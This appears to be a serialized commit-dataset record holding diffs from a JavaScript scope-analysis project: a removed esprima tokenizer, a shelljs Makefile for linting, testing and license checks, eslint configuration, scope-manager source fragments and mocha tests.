              lineStart: lineStart<c><\n>-                        range: [start<c> index]<\n>-                    };<\n>-                case 33: // !<\n>-                case 61: // =<\n>-                    index += 2;<\n>-                    // !== and ===<\n>-                    if (source.charCodeAt(index) === 61) {<\n>-                        ++index;<\n>-                    }<\n>-                    return {<\n>-                        type: Token.Punctuator<c><\n>-                        value: source.slice(start<c> index)<c><\n>-                        lineNumber: lineNumber<c><\n>-                        lineStart: lineStart<c><\n>-                        range: [start<c> index]<\n>-                    };<\n>-                default:<\n>-                    break;<\n>-                }<\n>-            }<\n>-            break;<\n>-        }<\n>-        // Peek more characters.<\n>-        ch2 = source[index + 1];<\n>-        ch3 = source[index + 2];<\n>-        ch4 = source[index + 3];<\n>-        // 4-character punctuator: >>>=<\n>-        if (ch1 === '>' && ch2 === '>' && ch3 === '>') {<\n>-            if (ch4 === '=') {<\n>-                index += 4;<\n>-                return {<\n>-                    type: Token.Punctuator<c><\n>-                    value: '>>>='<c><\n>-                    lineNumber: lineNumber<c><\n>-                    lineStart: lineStart<c><\n>-                    range: [start<c> index]<\n>-                };<\n>-            }<\n>-        }<\n>-        // 3-character punctuators: === !== >>> <<= >>=<\n>-        if (ch1 === '>' && ch2 === '>' && ch3 === '>') {<\n>-            index += 3;<\n>-            return {<\n>-                type: Token.Punctuator<c><\n>-                value: '>>>'<c><\n>-                lineNumber: lineNumber<c><\n>-                lineStart: lineStart<c><\n>-                range: [start<c> index]<\n>-            };<\n>-        }<\n>-        if (ch1 === '<' && ch2 === '<' && ch3 === '=') {<\n>-            index += 3;<\n>-            return {<\n>-                type: Token.Punctuator<c><\n>-                value: '<<='<c><\n>-                lineNumber: lineNumber<c><\n>-                lineStart: lineStart<c><\n>-                range: [start<c> index]<\n>-            };<\n>-        }<\n>-        if (ch1 === '>' && ch2 === '>' && ch3 === '=') {<\n>-            index += 3;<\n>-            return {<\n>-                type: Token.Punctuator<c><\n>-                value: '>>='<c><\n>-                lineNumber: lineNumber<c><\n>-                lineStart: lineStart<c><\n>-                range: [start<c> index]<\n>-            };<\n>-        }<\n>-        if (ch1 === '.' && ch2 === '.' && ch3 === '.') {<\n>-            index += 3;<\n>-            return {<\n>-                type: Token.Punctuator<c><\n>-                value: '...'<c><\n>-                lineNumber: lineNumber<c><\n>-                lineStart: lineStart<c><\n>-                range: [start<c> index]<\n>-            };<\n>-        }<\n>-        // Other 2-character punctuators: ++ -- << >> && ||<\n>-        if (ch1 === ch2 && ('+-<>&|'.indexOf(ch1) >= 0)) {<\n>-            index += 2;<\n>-            return {<\n>-                type: Token.Punctuator<c><\n>-                value: ch1 + ch2<c><\n>-                lineNumber: lineNumber<c><\n>-                lineStart: lineStart<c><\n>-                range: [start<c> index]<\n>-            };<\n>-        }<\n>-        if (ch1 === '=' && ch2 === '>') {<\n>-            index += 2;<\n>-            return {<\n>-                type: Token.Punctuator<c><\n>-                value: '=>'<c><\n>-                lineNumber: lineNumber<c><\n>-                lineStart: lineStart<c><\n>-                range: [start<c> index]<\n>-            };<\n>-        }<\n>-        if ('<>=!+-*%&|^/'.indexOf(ch1) >= 0) {<\n>-            ++index;<\n>-            return {<\n>-                type: Token.Punctuator<c><\n>-                value: ch1<c><\n>-                lineNumber: lineNumber<c><\n>-                lineStart: lineStart<c><\n>-                range: [start<c> index]<\n>-            };<\n>-        }<\n>-        if (ch1 === '.') {<\n>-            ++index;<\n>-            return {<\n>-                type: Token.Punctuator<c><\n>-                value: ch1<c><\n>-                lineNumber: lineNumber<c><\n>-                lineStart: lineStart<c><\n>-                range: [start<c> index]<\n>-            };<\n>-        }<\n>-        throwError({}<c> Messages.UnexpectedToken<c> 'ILLEGAL');<\n>-    }<\n>-    // 7.8.3 Numeric Literals<\n>-    function scanHexLiteral(start) {<\n>-        var number = '';<\n>-        while (index < length) {<\n>-            if (!isHexDigit(source[index])) {<\n>-                break;<\n>-            }<\n>-            number += source[index++];<\n>-        }<\n>-        if (number.length === 0) {<\n>-            throwError({}<c> Messages.UnexpectedToken<c> 'ILLEGAL');<\n>-        }<\n>-        if (isIdentifierStart(source.charCodeAt(index))) {<\n>-            throwError({}<c> Messages.UnexpectedToken<c> 'ILLEGAL');<\n>-        }<\n>-        return {<\n>-            type: Token.NumericLiteral<c><\n>-            value: parseInt('0x' + number<c> 16)<c><\n>-            lineNumber: lineNumber<c><\n>-            lineStart: lineStart<c><\n>-            range: [start<c> index]<\n>-        };<\n>-    }<\n>-    function scanOctalLiteral(prefix<c> start) {<\n>-        var number<c> octal;<\n>-        if (isOctalDigit(prefix)) {<\n>-            octal = true;<\n>-            number = '0' + source[index++];<\n>-        } else {<\n>-            octal = false;<\n>-            ++index;<\n>-            number = '';<\n>-        }<\n>-        while (index < length) {<\n>-            if (!isOctalDigit(source[index])) {<\n>-                break;<\n>-            }<\n>-            number += source[index++];<\n>-        }<\n>-        if (!octal && number.length === 0) {<\n>-            // only 0o or 0O<\n>-            throwError({}<c> Messages.UnexpectedToken<c> 'ILLEGAL');<\n>-        }<\n>-        if (isIdentifierStart(source.charCodeAt(index)) || isDecimalDigit(source.charCodeAt(index))) {<\n>-            throwError({}<c> Messages.UnexpectedToken<c> 'ILLEGAL');<\n>-        }<\n>-        return {<\n>-            type: Token.NumericLiteral<c><\n>-            value: parseInt(number<c> 8)<c><\n>-            octal: octal<c><\n>-            lineNumber: lineNumber<c><\n>-            lineStart: lineStart<c><\n>-            range: [start<c> index]<\n>-        };<\n>-    }<\n>-    function scanNumericLiteral() {<\n>-        var number<c> start<c> ch<c> octal;<\n>-        ch = source[index];<\n>-        assert(isDecimalDigit(ch.charCodeAt(0)) || (ch === '.')<c><\n>-            'Numeric literal must start with a decimal digit or a decimal point');<\n>-        start = index;<\n>-        number = '';<\n>-        if (ch !== '.') {<\n>-            number = source[index++];<\n>-            ch = source[index];<\n>-            // Hex number starts with '0x'.<\n>-            // Octal number starts with '0'.<\n>-            // Octal number in ES6 starts with '0o'.<\n>-            // Binary number in ES6 starts with '0b'.<\n>-            if (number === '0') {<\n>-                if (ch === 'x' || ch === 'X') {<\n>-                    ++index;<\n>-                    return scanHexLiteral(start);<\n>-                }<\n>-                if (ch === 'b' || ch === 'B') {<\n>-                    ++index;<\n>-                    number = '';<\n>-                    while (index < length) {<\n>-                        ch = source[index];<\n>-                        if (ch !== '0' && ch !== '1') {<\n>-                            break;<\n>-                        }<\n>-                        number += source[index++];<\n>-                    }<\n>-                    if (number.length === 0) {<\n>-                        // only 0b or 0B<\n>-                        throwError({}<c> Messages.UnexpectedToken<c> 'ILLEGAL');<\n>-                    }<\n>-                    if (index < length) {<\n>-                        ch = source.charCodeAt(index);<\n>-                        /* istanbul ignore else */<\n>-                        if (isIdentifierStart(ch) || isDecimalDigit(ch)) {<\n>-                            throwError({}<c> Messages.UnexpectedToken<c> 'ILLEGAL');<\n>-                        }<\n>-                    }<\n>-                    return {<\n>-                        type: Token.NumericLiteral<c><\n>-                        value: parseInt(number<c> 2)<c><\n>-                        lineNumber: lineNumber<c><\n>-                        lineStart: lineStart<c><\n>-                        range: [start<c> index]<\n>-                    };<\n>-                }<\n>-                if (ch === 'o' || ch === 'O' || isOctalDigit(ch)) {<\n>-                    return scanOctalLiteral(ch<c> start);<\n>-                }<\n>-                // decimal number starts with '0' such as '09' is illegal.<\n>-                if (ch && isDecimalDigit(ch.charCodeAt(0))) {<\n>-                    throwError({}<c> Messages.UnexpectedToken<c> 'ILLEGAL');<\n>-                }<\n>-            }<\n>-            while (isDecimalDigit(source.charCodeAt(index))) {<\n>-                number += source[index++];<\n>-            }<\n>-            ch = source[index];<\n>-        }<\n>-        if (ch === '.') {<\n>-            number += source[index++];<\n>-            while (isDecimalDigit(source.charCodeAt(index))) {<\n>-                number += source[index++];<\n>-            }<\n>-            ch = source[index];<\n>-        }<\n>-        if (ch === 'e' || ch === 'E') {<\n>-            number += source[index++];<\n>-            ch = source[index];<\n>-            if (ch === '+' || ch === '-') {<\n>-                number += source[index++];<\n>-            }<\n>-            if (isDecimalDigit(source.charCodeAt(index))) {<\n>-                while (isDecimalDigit(source.charCodeAt(index))) {<\n>-                    number += source[index++];<\n>-                }<\n>-            } else {<\n>-                throwError({}<c> Messages.UnexpectedToken<c> 'ILLEGAL');<\n>-            }<\n>-        }<\n>-        if (isIdentifierStart(source.charCodeAt(index))) {<\n>-            throwError({}<c> Messages.UnexpectedToken<c> 'ILLEGAL');<\n>-        }<\n>-        return {<\n>-            type: Token.NumericLiteral<c><\n>-            value: parseFloat(number)<c><\n>-            lineNumber: lineNumber<c><\n>-            lineStart: lineStart<c><\n>-            range: [start<c> index]<\n>-        };<\n>-    }<\n>-    // 7.8.4 String Literals<\n>-    function scanStringLiteral() {<\n>-        var str = ''<c> quote<c> start<c> ch<c> code<c> unescaped<c> restore<c> octal = false;<\n>-        quote = source[index];<\n>-        assert((quote === '\'' || quote === '""')<c><\n>-            'String literal must starts with a quote');<\n>-        start = index;<\n>-        ++index;<\n>-        while (index < length) {<\n>-            ch = source[index++];<\n>-            if (ch === quote) {<\n>-                quote = '';<\n>-                break;<\n>-            } else if (ch === '\\') {<\n>-                ch = source[index++];<\n>-                if (!ch || !isLineTerminator(ch.charCodeAt(0))) {<\n>-                    switch (ch) {<\n>-                    case 'n':<\n>-                        str += '\n';<\n>-                        break;<\n>-                    case 'r':<\n>-                        str += '\r';<\n>-                        break;<\n>-                    case 't':<\n>-                        str += '\t';<\n>-                        break;<\n>-                    case 'u':<\n>-                    case 'x':<\n>-                        if (source[index] === '{') {<\n>-                            ++index;<\n>-                            str += scanUnicodeCodePointEscape();<\n>-                        } else {<\n>-                            restore = index;<\n>-                            unescaped = scanHexEscape(ch);<\n>-                            if (unescaped) {<\n>-                                str += unescaped;<\n>-                            } else {<\n>-                                index = restore;<\n>-                                str += ch;<\n>-                            }<\n>-                        }<\n>-                        break;<\n>-                    case 'b':<\n>-                        str += '\b';<\n>-                        break;<\n>-                    case 'f':<\n>-                        str += '\f';<\n>-                        break;<\n>-                    case 'v':<\n>-                        str += '\x0B';<\n>-                        break;<\n>-                    default:<\n>-                        if (isOctalDigit(ch)) {<\n>-                            code = '01234567'.indexOf(ch);<\n>-                            // \0 is not octal escape sequence<\n>-                            if (code !== 0) {<\n>-                                octal = true;<\n>-                            }<\n>-                            /* istanbul ignore else */<\n>-                            if (index < length && isOctalDigit(source[index])) {<\n>-                                octal = true;<\n>-                                code = code * 8 + '01234567'.indexOf(source[index++]);<\n>-                                // 3 digits are only allowed when string starts<\n>-                                // with 0<c> 1<c> 2<c> 3<\n>-                                if ('0123'.indexOf(ch) >= 0 &&<\n>-                                        index < length &&<\n>-                                        isOctalDigit(source[index])) {<\n>-                                    code = code * 8 + '01234567'.indexOf(source[index++]);<\n>-                                }<\n>-                            }<\n>-                            str += String.fromCharCode(code);<\n>-                        } else {<\n>-                            str += ch;<\n>-                        }<\n>-                        break;<\n>-                    }<\n>-                } else {<\n>-                    ++lineNumber;<\n>-                    if (ch ===  '\r' && source[index] === '\n') {<\n>-                        ++index;<\n>-                    }<\n>-                    lineStart = index;<\n>-                }<\n>-            } else if (isLineTerminator(ch.charCodeAt(0))) {<\n>-                break;<\n>-            } else {<\n>-                str += ch;<\n>-            }<\n>-        }<\n>-        if (quote !== '') {<\n>-            throwError({}<c> Messages.UnexpectedToken<c> 'ILLEGAL');<\n>-        }<\n>-        return {<\n>-            type: Token.StringLiteral<c><\n>-            value: str<c><\n>-            octal: octal<c><\n>-            lineNumber: lineNumber<c><\n>-            lineStart: lineStart<c><\n>-            range: [start<c> index]<\n>-        };<\n>-    }<\n>-    function scanTemplate() {<\n>-        var cooked = ''<c> ch<c> start<c> terminated<c> tail<c> restore<c> unescaped<c> code<c> octal;<\n>-        terminated = false;<\n>-        tail = false;<\n>-        start = index;<\n>-        ++index;<\n>-        while (index < length) {<\n>-            ch = source[index++];<\n>-            if (ch === '`') {<\n>-                tail = true;<",F
17,56,56,569,4,26,Reyad Attiyat,34,5,15,15,User,0,2516,Thu,9,57,16 Feb 2017,Add Makefile.js and eslint (#15),2,3,43,3199,167097,"+env:<\n>+    node: true<\n>+    es6: true<\n>+parserOptions:<\n>+    ecmaVersion: 6<\n>+extends: eslint<\n>+/coverage/<\n>+/**<\n>+ * @fileoverview Build file<\n>+ * @author nzakas<\n>+ * @copyright jQuery Foundation and other contributors<c> https://jquery.org/<\n>+ * MIT License<\n>+ */<\n>+/* global echo<c> exec<c> exit<c> set<c> target */<\n>+""use strict"";<\n>+/* eslint no-console: 0*/<\n>+//------------------------------------------------------------------------------<\n>+// Requirements<\n>+//------------------------------------------------------------------------------<\n>+require(""shelljs/make"");<\n>+set(""+e"");<\n>+const checker = require(""npm-license"");<\n>+//------------------------------------------------------------------------------<\n>+// Settings<\n>+//------------------------------------------------------------------------------<\n>+const OPEN_SOURCE_LICENSES = [<\n>+    /MIT/<c> /BSD/<c> /Apache/<c> /ISC/<c> /WTF/<c> /Public Domain/<\n>+];<\n>+//------------------------------------------------------------------------------<\n>+// Data<\n>+//------------------------------------------------------------------------------<\n>+const NODE = ""node""<c><\n>+    NODE_MODULES = ""./node_modules/""<c><\n>+    // Utilities - intentional extra space at the end of each string<\n>+    MOCHA = NODE_MODULES + ""mocha/bin/_mocha ""<c><\n>+    ESLINT = `${NODE} ${NODE_MODULES}/eslint/bin/eslint `<c><\n>+    ISTANBUL = `${NODE} ${NODE_MODULES}/istanbul/lib/cli.js `<c><\n>+    // Files<\n>+    MAKEFILE = ""./Makefile.js""<c><\n>+    JS_FILES = ""src/**/*.js""<c><\n>+    TEST_FILES = ""test/**/*.js"";<\n>+//------------------------------------------------------------------------------<\n>+// Tasks<\n>+//------------------------------------------------------------------------------<\n>+target.all = function() {<\n>+    target.test();<\n>+target.lint = function() {<\n>+    var errors = 0<c><\n>+        lastReturn;<\n>+    echo(""Validating Makefile.js"");<\n>+    lastReturn = exec(ESLINT + MAKEFILE);<\n>+    if (lastReturn.code !== 0) {<\n>+        errors++;<\n>+    }<\n>+    echo(""Validating JavaScript files"");<\n>+    lastReturn = exec(ESLINT + JS_FILES);<\n>+    if (lastReturn.code !== 0) {<\n>+        errors++;<\n>+    }<\n>+    echo(""Validating JavaScript test files"");<\n>+    lastReturn = exec(ESLINT + TEST_FILES);<\n>+    if (lastReturn.code !== 0) {<\n>+        errors++;<\n>+    }<\n>+    if (errors) {<\n>+        exit(1);<\n>+    }<\n>+target.test = function() {<\n>+    target.lint();<\n>+    var errors = 0<c><\n>+        lastReturn;<\n>+    lastReturn = exec(`${ISTANBUL} cover ${MOCHA} -- -R progress -c ${TEST_FILES}`);<\n>+    if (lastReturn.code !== 0) {<\n>+        errors++;<\n>+    }<\n>+    if (errors) {<\n>+        exit(1);<\n>+    }<\n>+    target.checkLicenses();<\n>+target.checkLicenses = function() {<\n>+    /**<\n>+     * Returns true if the given dependency's licenses are all permissable for use in OSS<\n>+     * @param  {object}  dependency object containing the name and licenses of the given dependency<\n>+     * @returns {boolean} is permissable dependency<\n>+     */<\n>+    function isPermissible(dependency) {<\n>+        var licenses = dependency.licenses;<\n>+        if (Array.isArray(licenses)) {<\n>+            return licenses.some(function(license) {<\n>+                return isPermissible({<\n>+                    name: dependency.name<c><\n>+                    licenses: license<\n>+                });<\n>+            });<\n>+        }<\n>+        return OPEN_SOURCE_LICENSES.some(function(license) {<\n>+            return license.test(licenses);<\n>+        });<\n>+    }<\n>+    echo(""Validating licenses"");<\n>+    checker.init({<\n>+        start: __dirname<\n>+    }<c> function(deps) {<\n>+        var impermissible = Object.keys(deps).map(function(dependency) {<\n>+            return {<\n>+                name: dependency<c><\n>+                licenses: deps[dependency].licenses<\n>+            };<\n>+        }).filter(function(dependency) {<\n>+            return !isPermissible(dependency);<\n>+        });<\n>+        if (impermissible.length) {<\n>+            impermissible.forEach(function(dependency) {<\n>+                console.error(""%s license for %s is impermissible.""<c><\n>+                    dependency.licenses<c><\n>+                    dependency.name<\n>+                );<\n>+            });<\n>+            exit(1);<\n>+        }<\n>+    });<\n>+    ""node"": "">=4.0.0""<\n>+    ""test"": ""node Makefile.js test""<c><\n>+    ""lint"": ""node Makefile.js lint""<c><\n>+    ""eslint"": ""^3.15.0""<c><\n>+    ""eslint-config-eslint"": ""^3.0.0""<c><\n>+    ""istanbul"": ""^0.4.5""<c><\n>+    ""mocha"": ""^3.2.0""<c><\n>+    ""npm-license"": ""^0.3.3""<c><\n>+    ""shelljs"": ""^0.7.6""<c><\n>+const Variable = require(""./variable"");<\n>+/* eslint no-underscore-dangle: [""error""<c> { ""allow"": [""__currentScope""] }] */<\n>+const assert = require(""assert"");<\n>+const ScopeManager = require(""./scope-manager"");<\n>+const Referencer = require(""./referencer"");<\n>+const Reference = require(""./reference"");<\n>+const Variable = require(""./variable"");<\n>+const Scope = require(""./scope"");<\n>+const version = require(""../package.json"").version;<\n>+/**<\n>+ * Set the default options<\n>+ * @returns {Object} options<\n>+ */<\n>+        sourceType: ""script""<c>  // one of ['script'<c> 'module']<\n>+        fallback: ""iteration""<\n>+/**<\n>+ * Preform deep update on option object<\n>+ * @param {Object} target - Options<\n>+ * @param {Object} override - Updates<\n>+ * @returns {Object} Updated options<\n>+ */<\n>+    /**<\n>+     * Is hash object<\n>+     * @param {Object} value - Test value<\n>+     * @returns {boolean} Result<\n>+     */<\n>+    function isHashObject(value) {<\n>+        return typeof value === ""object"" && value instanceof Object && !(value instanceof Array) && !(value instanceof RegExp);<\n>+ * @param {esprima.Tree} tree - Abstract Syntax Tree<\n>+ * @returns {ScopeManager} ScopeManager<\n>+    assert(scopeManager.__currentScope === null<c> ""currentScope should be null."");<\n>+/* eslint-disable no-undefined */<\n>+const Syntax = require(""estraverse"").Syntax;<\n>+const esrecurse = require(""esrecurse"");<\n>+/**<\n>+ * Get last array element<\n>+ * @param {array} xs - array<\n>+ * @returns {any} Last elment<\n>+ */<\n>+            rest: lastRestElement !== null && lastRestElement !== undefined && lastRestElement.argument === pattern<c><\n>+        node.arguments.forEach(a => {<\n>+            this.rightHandNodes.push(a);<\n>+        });<\n>+    constructor(ident<c> scope<c> flag<c> writeExpr<c> maybeImplicitGlobal<c> partial<c> init) {<\n>+     * @returns {boolean} static<\n>+     * @returns {boolean} write<\n>+     * @returns {boolean} read<\n>+     * @returns {boolean} read only<\n>+     * @returns {boolean} write only<\n>+     * @returns {boolean} read write<\n>+/* eslint-disable no-underscore-dangle */<\n>+/* eslint-disable no-undefined */<\n>+const Syntax = require(""estraverse"").Syntax;<\n>+const esrecurse = require(""esrecurse"");<\n>+const Reference = require(""./reference"");<\n>+const Variable = require(""./variable"");<\n>+const PatternVisitor = require(""./pattern-visitor"");<\n>+const definition = require(""./definition"");<\n>+const assert = require(""assert"");<\n>+/**<\n>+ * Traverse identifier in pattern<\n>+ * @param {Object} options - options<\n>+ * @param {pattern} rootPattern - root pattern<\n>+ * @param {Refencer} referencer - referencer<\n>+ * @param {callback} callback - callback<\n>+ * @returns {void}<\n>+ */<\n>+    if (referencer !== null && referencer !== undefined) {<\n>+        if (typeof options === ""function"") {<\n>+            options = {processRightHandNodes: false};<\n>+        const that = this;<\n>+        /**<\n>+         * Visit pattern callback<\n>+         * @param {pattern} pattern - pattern<\n>+         * @param {Object} info - info<\n>+         * @returns {void}<\n>+         */<\n>+        function visitPatternCallback(pattern<c> info) {<\n>+            that.currentScope().__define(pattern<c><\n>+                new ParameterDefinition(<\n>+                    pattern<c><\n>+                    node<c><\n>+                    i<c><\n>+                    info.rest<\n>+                ));<\n>+            that.referencingDefaultValue(pattern<c> info.assignments<c> null<c> true);<\n>+        }<\n>+            this.visitPattern(node.params[i]<c> {processRightHandNodes: true}<c> visitPatternCallback);<\n>+                type: ""RestElement""<c><\n>+        if (node.left.type === Syntax.VariableDeclaration && node.left.kind !== ""var"") {<\n>+            if (node.operator === ""="") {<\n>+        if (node.init && node.init.type === Syntax.VariableDeclaration && node.init.kind !== ""var"") {<\n>+        if (!this.scopeManager.__ignoreEval() && node.callee.type === Syntax.Identifier && node.callee.name === ""eval"") {<\n>+        variableTargetScope = (node.kind === ""var"") ? this.currentScope().variableScope : this.currentScope();<\n>+        assert(this.scopeManager.__isES6() && this.scopeManager.isModule()<c> ""ImportDeclaration should appear when the mode is ES6 and in the module context."");<\n>+/* eslint-disable no-underscore-dangle */<\n>+const Scope = require(""./scope"");<\n>+const assert = require(""assert"");<\n>+        return this.__options.sourceType === ""module"";<\n>+     * @returns {Scope?} Scope from node<\n>+        /**<\n>+         * predicate<\n>+         * @param {Scope} testScope - scope to test<\n>+         * @returns {boolean} predicate<\n>+         */<\n>+        function predicate(testScope) {<\n>+            if (testScope.type === ""function"" && testScope.functionExpressionScope) {<\n>+            if (testScope.type === ""TDZ"") {<\n>+     * @returns {Scopes?} Scope array<\n>+     * @returns {Scope?} upper scope for the node.<\n>+    __nestBlockScope(node) {<\n>+/* eslint-disable no-underscore-dangle */<\n>+/* eslint-disable no-undefined */<\n>+const Syntax = require(""estraverse"").Syntax;<\n>+const Reference = require(""./reference"");<\n>+const Variable = require(""./variable"");<\n>+const Definition = require(""./definition"").Definition;<\n>+const assert = require(""assert"");<\n>+/**<\n>+ * Test if scope is struct<\n>+ * @param {Scope} scope - scope<\n>+ * @param {Block} block - block<\n>+ * @param {boolean} isMethodDefinition - is method definiton<\n>+ * @param {boolean} useDirective - use directive<\n>+ * @returns {boolean} is strict scope<\n>+ */<\n>+    if (scope.type === ""class"" || scope.type === ""module"") {<\n>+    if (scope.type === ""block"" || scope.type === ""switch"") {<\n>+    if (scope.type === ""function"") {<\n>+    } else if (scope.type === ""global"") {<\n>+            if (stmt.raw === ""\""use strict\"""" || stmt.raw === ""'use strict'"") {<\n>+            if (expr.type !== Syntax.Literal || typeof expr.value !== ""string"") {<\n>+            if (expr.raw !== null && expr.raw !== undefined) {<\n>+                if (expr.raw === ""\""use strict\"""" || expr.raw === ""'use strict'"") {<\n>+                if (expr.value === ""use strict"") {<\n>+/**<\n>+ * Register scope<\n>+ * @param {ScopeManager} scopeManager - scope manager<\n>+ * @param {Scope} scope - scope<\n>+ * @returns {void}<\n>+ */<\n>+/**<\n>+ * Should be statically<\n>+ * @param {Object} def - def<\n>+ * @returns {boolean} should be statically<\n>+ */<\n>+        (def.type === Variable.Variable && def.parent.kind !== ""var"")<\n>+        this.dynamic = this.type === ""global"" || this.type === ""with"";<\n>+            (this.type === ""global"" || this.type === ""function"" || this.type === ""module"") ? this : upperScope.variableScope;<\n>+        } else if (this.type !== ""global"") {<\n>+        if (node === null || node === undefined) {<\n>+        if (variables === null || variables === undefined) {<\n>+        if (node.name === ""super"") {<\n>+     * @returns {Reference} reference<\n>+        assert(this.__isClosed()<c> ""Scope should be closed."");<\n>+        assert(ident.type === Syntax.Identifier<c> ""Target should be identifier."");<\n>+     * @returns {boolean} static<\n>+     * @returns {boolean} arguemnts materialized<\n>+     * @returns {boolean} this materialized<\n>+        super(scopeManager<c> ""global""<c> null<c> block<c> false);<\n>+        super(scopeManager<c> ""module""<c> upperScope<c> block<c> false);<\n>+        super(scopeManager<c> ""function-expression-name""<c> upperScope<c> block<c> false);<\n>+        super(scopeManager<c> ""catch""<c> upperScope<c> block<c> false);<\n>+        super(scopeManager<c> ""with""<c> upperScope<c> block<c> false);<\n>+        super(scopeManager<c> ""TDZ""<c> upperScope<c> block<c> false);<\n>+        super(scopeManager<c> ""block""<c> upperScope<c> block<c> false);<\n>+        super(scopeManager<c> ""switch""<c> upperScope<c> block<c> false);<\n>+        super(scopeManager<c> ""function""<c> upperScope<c> block<c> isMethodDefinition);<\n>+        let variable = this.set.get(""arguments"");<\n>+        assert(variable<c> ""Always have arguments variable."");<\n>+        return variable.tainted || variable.references.length !== 0;<\n>+                ""arguments""<c><\n>+        this.taints.set(""arguments""<c> true);<\n>+class ForScope extends Scope {<\n>+        super(scopeManager<c> ""for""<c> upperScope<c> block<c> false);<\n>+        super(scopeManager<c> ""class""<c> upperScope<c> block<c> false);<\n>+Variable.CatchClause = ""CatchClause"";<\n>+Variable.Parameter = ""Parameter"";<\n>+Variable.FunctionName = ""FunctionName"";<\n>+Variable.ClassName = ""ClassName"";<\n>+Variable.Variable = ""Variable"";<\n>+Variable.ImportBinding = ""ImportBinding"";<\n>+Variable.TDZ = ""TDZ"";<\n>+Variable.ImplicitGlobalVariable = ""ImplicitGlobalVariable"";<\n>+env:<\n>+    mocha: true<\n>+extends: '../.eslintrc.yml'<\n>+/* eslint-disable no-unused-expressions */<\n>+const expect = require(""chai"").expect;<\n>+const esprima = require(""esprima"");<\n>+const analyze = require("".."").analyze;<\n>+describe(""arguments""<c> function() {<\n>+    it(""arguments are correctly materialized""<c> function() {<\n>+        expect(globalScope.type).to.be.equal(""global"");<\n>+        expect(scope.type).to.be.equal(""function"");<\n>+        expect(scope.variables[0].name).to.be.equal(""arguments"");<\n>+/* eslint-disable no-unused-expressions */<\n>+const expect = require(""chai"").expect;<\n>+const esprima = require(""esprima"");<\n>+const analyze = require("".."").analyze;<\n>+describe(""catch""<c> function() {<\n>+    it(""creates scope""<c> function() {<\n>+        expect(globalScope.type).to.be.equal(""global"");<\n>+        expect(scope.type).to.be.equal(""function"");<\n>+        expect(scope.variables[0].name).to.be.equal(""arguments"");<\n>+        expect(scope.type).to.be.equal(""catch"");<\n>+        expect(scope.variables[0].name).to.be.equal(""e"");<\n>+const expect = require(""chai"").expect;<\n>+const esprima = require(""esprima"");<\n>+const analyze = require("".."").analyze;<\n>+describe(""childVisitorKeys option""<c> function() {<\n>+    it(""should handle as a known node if the childVisitorKeys option was given.""<c> function() {<\n>+        ast.body[0].declarations[0].init.type = ""NumericLiteral"";<\n>+                fallback: ""none""<c><\n>+    it(""should not visit to properties which are not given.""<c> function() {<\n>+            type: ""TestNode""<c><\n>+    it(""should visit to given properties.""<c> function() {<\n>+            type: ""TestNode""<c><\n>+                    TestNode: [""argument""]<\n>+        expect(globalScope.through[0].identifier.name).to.equal(""bar"");<\n>+/* eslint-disable no-unused-expressions */<\n>+const expect = require(""chai"").expect;<\n>+const parse = require(""../third_party/esprima"").parse;<\n>+const analyze = require("".."").analyze;<\n>+describe(""ES6 arrow function expression""<c> function() {<\n>+    it(""materialize scope for arrow function expression""<c> function() {<\n>+        expect(scope.type).to.be.equal(""global"");<\n>+        expect(scope.block.type).to.be.equal(""Program"");<\n>+        expect(scope.type).to.be.equal(""function"");<\n>+        expect(scope.block.type).to.be.equal(""ArrowFunctionExpression"");<\n>+        expect(scope.variables[0].name).to.be.equal(""i"");<\n>+        expect(scope.variables[1].name).to.be.equal(""j"");<\n>+    it(""generate bindings for parameters""<c> function() {<\n>+        const ast = parse(""var arrow = (a<c> b<c> c<c> d) => {}"");<\n>+        expect(scope.type).to.be.equal(""global"");<\n>+        expect(scope.block.type).to.be.equal(""Program"");<\n>+        expect(scope.type).to.be.equal(""function"");<\n>+        expect(scope.block.type).to.be.equal(""ArrowFunctionExpression"");<\n>+        expect(scope.variables[0].name).to.be.equal(""a"");<\n>+        expect(scope.variables[1].name).to.be.equal(""b"");<\n>+        expect(scope.variables[2].name).to.be.equal(""c"");<\n>+        expect(scope.variables[3].name).to.be.equal(""d"");<\n>+/* eslint-disable no-unused-expressions */<\n>+const expect = require(""chai"").expect;<\n>+const parse = require(""../third_party/esprima"").parse;<\n>+const analyze = require("".."").analyze;<\n>+describe(""ES6 block scope""<c> function() {<\n>+    it(""let is materialized in ES6 block scope#1""<c> function() {<\n>+        expect(scope.type).to.be.equal(""global"");<\n>+        expect(scope.type).to.be.equal(""block"");<\n>+        expect(scope.variables[0].name).to.be.equal(""i"");<\n>+        expect(scope.references[0].identifier.name).to.be.equal(""i"");<\n>+        expect(scope.references[1].identifier.name).to.be.equal(""i"");<\n>+    it(""let is materialized in ES6 block scope#2""<c> function() {<\n>+        expect(scope.type).to.be.equal(""global"");<\n>+        expect(scope.variables[0].name).to.be.equal(""i"");<\n>+        expect(scope.type).to.be.equal(""block"");<\n>+        expect(scope.variables[0].name).to.be.equal(""i"");<\n>+        expect(scope.references[0].identifier.name).to.be.equal(""i"");<\n>+        expect(scope.references[1].identifier.name).to.be.equal(""i"");<\n>+        expect(scope.references[2].identifier.name).to.be.equal(""i"");<\n>+    it(""function delaration is materialized in ES6 block scope""<c> function() {<\n>+        expect(scope.type).to.be.equal(""global"");<\n>+        expect(scope.type).to.be.equal(""block"");<\n>+        expect(scope.variables[0].name).to.be.equal(""test"");<\n>+        expect(scope.references[0].identifier.name).to.be.equal(""test"");<\n>+        expect(scope.type).to.be.equal(""function"");<\n>+        expect(scope.variables[0].name).to.be.equal(""arguments"");<\n>+    it(""let is not hoistable#1""<c> function() {<\n>+        expect(globalScope.type).to.be.equal(""global"");<\n>+        expect(globalScope.variables[0].name).to.be.equal(""i"");<\n>+        expect(scope.type).to.be.equal(""block"");<\n>+        expect(scope.variables[0].name).to.be.equal(""i"");<\n>+    it(""let is not hoistable#2""<c> function() {<\n>+        expect(globalScope.type).to.be.equal(""global"");<\n>+        expect(scope.type).to.be.equal(""function"");<\n>+        expect(scope.variables[0].name).to.be.equal(""arguments"");<\n>+        expect(scope.variables[1].name).to.be.equal(""i"");<\n>+        expect(scope.type).to.be.equal(""block"");<\n>+        expect(scope.variables[0].name).to.be.equal(""i"");<\n>+        expect(scope.type).to.be.equal(""block"");<\n>+        expect(scope.variables[0].name).to.be.equal(""i"");<\n>+/* eslint-disable no-unused-expressions */<\n>+const expect = require(""chai"").expect;<\n>+const parse = require(""../third_party/esprima"").parse;<\n>+const analyze = require("".."").analyze;<\n>+describe(""ES6 catch""<c> function() {<\n>+    it(""takes binding pattern""<c> function() {<\n>+        expect(scope.type).to.be.equal(""global"");<\n>+        